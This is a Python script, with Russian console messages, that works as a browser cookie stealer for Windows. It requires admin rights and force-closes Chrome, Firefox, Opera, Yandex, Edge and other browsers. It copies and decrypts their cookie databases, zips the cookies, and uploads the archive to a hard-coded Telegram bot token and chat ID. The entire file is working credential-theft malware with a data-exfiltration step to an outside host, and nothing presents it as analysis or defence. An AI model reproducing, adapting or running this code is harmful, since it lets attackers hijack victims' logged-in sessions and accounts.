import os
import sqlite3
import base64
import zipfile
import requests
import tempfile
import shutil
import subprocess
import ctypes
from win32crypt import CryptUnprotectData

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("ТРЕБУЮТСЯ АДМИНИСТРАТОРНЫЕ ПРАВА! Запустите от имени администратора")
    input("Нажмите Enter для выхода...")
    exit(1)

def kill_browsers():
    browsers = [
        'chrome.exe', 'firefox.exe', 'opera.exe', 
        'browser.exe', 'yandex.exe', 'msedge.exe',
        'iexplore.exe', 'brave.exe'
    ]
    print("[+] Закрываем браузеры...")
    for browser in browsers:
        subprocess.call(['taskkill', '/F', '/IM', browser], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

def get_cookies_from_db(path, is_chrome=True):
    try:
        print(f"[+] Обработка: {path}")
        temp_db = tempfile.mktemp()
        shutil.copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        if is_chrome:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = []
            for host, name, encrypted_val in cursor.fetchall():
                try:
                    decrypted = CryptUnprotectData(encrypted_val)[1]
                    cookies.append(f"{host}\tTRUE\t/\t{name}\t{base64.b64encode(decrypted).decode()}")
                except:
                    continue
            print(f"  > Найдено {len(cookies)} кук Chrome-типа")
            return cookies
        
        else:  # Firefox
            cursor.execute("SELECT host, name, value FROM moz_cookies")
            cookies = [f"{host}\tTRUE\t/\t{name}\t{value}" for host, name, value in cursor.fetchall()]
            print(f"  > Найдено {len(cookies)} кук Firefox")
            return cookies
            
    except Exception as e:
        print(f"  ! Ошибка: {str(e)}")
        return []
    finally:
        conn.close()
        os.unlink(temp_db)

def main():
    kill_browsers()
    all_cookies = []
    
    print("\n[1] Поиск кук Chrome")
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(chrome_path):
        all_cookies.extend(get_cookies_from_db(chrome_path))

    print("\n[2] Поиск кук Firefox")
    firefox_profiles = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefox_profiles):
        for profile in os.listdir(firefox_profiles):
            if '.default' in profile:
                profile_path = os.path.join(firefox_profiles, profile)
                cookie_path = os.path.join(profile_path, 'cookies.sqlite')
                if os.path.exists(cookie_path):
                    all_cookies.extend(get_cookies_from_db(cookie_path, False))

    print("\n[3] Поиск кук Яндекс")
    yandex_path = os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(yandex_path):
        all_cookies.extend(get_cookies_from_db(yandex_path))

    print("\n[4] Поиск кук Opera")
    opera_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Network', 'Cookies')
    if os.path.exists(opera_path):
        all_cookies.extend(get_cookies_from_db(opera_path))

    print("\n[5] Поиск кук Edge")
    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(edge_path):
        all_cookies.extend(get_cookies_from_db(edge_path))

    if not all_cookies:
        print("\n[!] Куки не найдены!")
        input("\nНажмите Enter для выхода...")
        return

    print(f"\n[+] Всего собрано {len(all_cookies)} кук")
    print("[+] Создаем архив...")
    
    temp_dir = tempfile.mkdtemp()
    with open(os.path.join(temp_dir, 'cookies.txt'), 'w', encoding='utf-8') as f:
        f.write("\n".join(all_cookies))
    
    zip_path = os.path.join(os.environ['TEMP'], 'cookies.zip')
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(os.path.join(temp_dir, 'cookies.txt'), 'cookies.txt')
    
    shutil.rmtree(temp_dir)
    print(f"[+] Архив создан: {zip_path}")

    print("\n[+] Отправка в Telegram...")
    try:
        BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
        CHAT_ID = "1962231620"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(zip_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID})
        print("[+] Отправлено успешно!")
    except Exception as e:
        print(f"[!] Ошибка отправки: {str(e)}")
    
    os.unlink(zip_path)
    input("\nНажмите Enter для выхода...")

if __name__ == "__main__":
    main()
